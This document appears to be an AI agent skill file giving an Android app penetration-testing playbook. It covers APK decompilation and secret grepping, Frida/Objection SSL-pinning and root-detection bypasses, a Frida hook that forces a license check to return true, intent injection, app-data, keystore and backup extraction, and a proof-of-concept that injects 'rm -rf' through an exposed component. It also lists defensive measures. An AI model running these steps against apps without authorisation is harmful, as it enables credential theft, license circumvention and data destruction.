---
name: mobile-android
description: Android APK pentest workflow — apktool/jadx static, Frida dynamic instrumentation, SSL pinning bypass, root detection bypass, intent fuzzing, keystore extraction.
when_to_use: "android apk apk-extract jadx apktool frida objection mobsf ssl pinning root detect intent webview"
mitre_attack: T1517, T1640, T1418, T1409
metadata:
  subdomain: mobile
  upstream_refs:
    - https://github.com/skylot/jadx
    - https://github.com/frida/frida
    - https://github.com/sensepost/objection
    - https://github.com/MobSF/Mobile-Security-Framework-MobSF
    - https://github.com/ImKKingshuk/LockKnife
---

# Android Pentest Playbook

## 1. Static — decompile + inspect

### Pull APK
```bash
# Listed apps on connected device
adb shell pm list packages -3            # third-party only
adb shell pm path com.target.app         # find APK path
adb pull /data/app/.../base.apk /tmp/

# Or from Google Play
gplaycli -d com.target.app -f /tmp/      # CLI Play store dump

# Or from third-party APK mirrors (apkpure / apkmirror)
```

### Decompile
```bash
# Smali (low-level)
apktool d base.apk -o /tmp/apk-smali

# Java pseudo-code (jadx)
jadx --output-dir /tmp/apk-java base.apk
# Or jadx-gui for interactive

# Combine for full picture
```

### MobSF automated triage
```bash
docker run -it --rm -p 8000:8000 opensecurity/mobile-security-framework-mobsf
# Upload APK via web UI, get full report
```

### Manifest review
```bash
apkanalyzer manifest print base.apk
# OR
aapt dump xmltree base.apk AndroidManifest.xml | head -50

# Critical signals:
# - android:debuggable="true"        → debugger attachable
# - android:allowBackup="true"       → adb backup possible w/o root
# - android:exported="true" w/o perm → exposed component
# - <uses-permission> SMS/CAMERA/MIC reach  → privacy risk
# - <intent-filter> w/ "android.intent.action.VIEW" + custom scheme → deeplink
# - networkSecurityConfig: cleartextTrafficPermitted="true" → MITM-friendly
```

### Secrets sweep
```bash
# Hardcoded keys in smali / java code
grep -rn 'api[_-]?key\|secret\|password' /tmp/apk-java/ | head -20

# Strings + entropy
strings -a base.apk | grep -E 'eyJhbGc|^[A-Za-z0-9+/]{30,}={0,2}$' | head

# AndroGuard for deep static
androguard analyze base.apk
```

## 2. Dynamic — Frida + Objection

### Setup
```bash
# Push frida-server (rooted device / emulator)
adb push frida-server-16.x.x-android-arm64 /data/local/tmp/
adb shell "chmod 755 /data/local/tmp/frida-server && /data/local/tmp/frida-server &"

# Or use Magisk module on prod devices
```

### Bypass SSL pinning (Frida codeshare scripts)
```bash
frida -U -l https://codeshare.frida.re/@pcipolloni/universal-android-ssl-pinning-bypass-with-frida/ -f com.target.app

# Or Objection's built-in
objection -g com.target.app explore
> android sslpinning disable
```

### Bypass root detection
```bash
objection -g com.target.app explore
> android root disable

# Or via Frida script — patches common checks (RootBeer, SafetyNet)
```

### Intercept TLS
```bash
# Burp or mitmproxy w/ root CA installed on device (or magisk-trust-user-certs)
# Then re-launch app — traffic visible in proxy
```

### Hook arbitrary functions
```javascript
// Frida script — hook a class method
Java.perform(function() {
    var Auth = Java.use("com.target.app.AuthManager");
    Auth.checkLicense.implementation = function() {
        console.log("checkLicense called, returning true");
        return true;
    };
});
```

## 3. Common Android-specific attack surface

### 3.1 Insecure deeplinks / intents
```bash
# Test exposed activity
adb shell am start -n com.target.app/com.target.app.MainActivity \
  -a android.intent.action.VIEW -d "myapp://attacker-controlled-url"

# Test exposed service / broadcast
adb shell am startservice -n com.target.app/.ExposedService --es extra "value"
adb shell am broadcast -a com.target.app.ACTION_X --ei param 999
```

### 3.2 WebView vulnerabilities
- `setJavaScriptEnabled(true)` + `addJavascriptInterface()` w/o `@JavascriptInterface` annotation → arbitrary Java method exec from JS
- `setAllowFileAccessFromFileURLs(true)` → file:// URL XSS reads local files
- Custom URL scheme handlers w/o validation

### 3.3 Insecure storage
```bash
# Pull app data (rooted)
adb shell run-as com.target.app cat /data/data/com.target.app/shared_prefs/Auth.xml

# SQLite DBs
adb shell run-as com.target.app sqlite3 /data/data/com.target.app/databases/main.db ".dump"
```

### 3.4 Keystore extraction
Android Keystore is supposed to be hardware-backed. On rooted devices
or devices w/ keystore bugs, keys extractable via:
- Frida hooks on `KeyStore.getKey()`
- LockKnife-style memory dump (https://github.com/ImKKingshuk/LockKnife)
- TEE exploitation (rare, advanced)

### 3.5 PIN brute / passkey
Android 14+ passkey biometric flow — LockKnife exploits Android pre-A14
keystore quirks. Modern Android raises the bar significantly.

### 3.6 Backup-restore confusion
If `allowBackup=true`:
```bash
adb backup com.target.app
# Pull backup, extract w/ android-backup-extractor (abe.jar)
java -jar abe.jar unpack backup.ab backup.tar
tar xvf backup.tar
```

## 4. Tools cheat-sheet

| Tool | Use |
|---|---|
| `apktool` | Smali decompile + repack |
| `jadx` | Java pseudo-code, GUI |
| `androguard` | Static API analysis library |
| `MobSF` | Web-UI automated triage |
| `Frida` | Runtime instrumentation |
| `Objection` | Frida-based REPL for common tasks |
| `drozer` | IPC + content provider testing |
| `LockKnife` | Credential extraction (forensics) |
| `abe.jar` | Backup unpacking |
| `apkleaks` | Static secret sweep |
| `apksigner` | APK signature analysis |
| `bytecode-viewer` | Multi-decompiler GUI |

## 5. PoC framing

- Demonstrate API key extraction from static APK → use key to access backend
- Demonstrate SSL pinning bypass + traffic capture → show sensitive data over TLS-MITM'd connection
- Demonstrate exposed component RCE → `adb shell am start -n ... --es cmd 'rm -rf'`
- Document `allowBackup=true` + sensitive data extraction post-backup

## 6. Severity

| Bug | Severity |
|---|---|
| Hardcoded API key w/ admin scope | Critical 9.0 |
| Exposed activity → arbitrary intent injection | Critical 9.0 |
| WebView `addJavascriptInterface` → RCE in app context | Critical 9.0 |
| SSL pinning bypass + sensitive endpoint | High 8.0 |
| Backup extracts auth tokens | High 7-8 |
| Root detection bypass alone | Informational |
| Deeplink takeover (registered scheme) | High-Critical depending on flow |

## 7. Defender
- ProGuard / R8 obfuscation (raises bar; not security)
- Native code for cryptographic primitives + key derivation
- Hardware-backed Keystore (StrongBox where available)
- Network Security Config: cleartext denied, custom CA refusal
- SafetyNet / Play Integrity API for tamper detection
- Custom SSL pinning (not via system trust store)

## Cross-references
- Operator's `android-re` global skill (Decepticon-external)
- Reverser binary triage: `skills/reverser/triage/SKILL.md`
- Cipher/key extraction: `skills/exploit/crypto/SKILL.md`

## Known exemplars
- 2019: Multiple banking apps disclosed for SSL pinning bypass — $5-15k bounties
- 2021: Multiple Android apps w/ exposed activity RCE chains
- LockKnife (2024): Android forensics credential extraction tool
- Routine: hardcoded Firebase URLs + permissive rules → full DB read
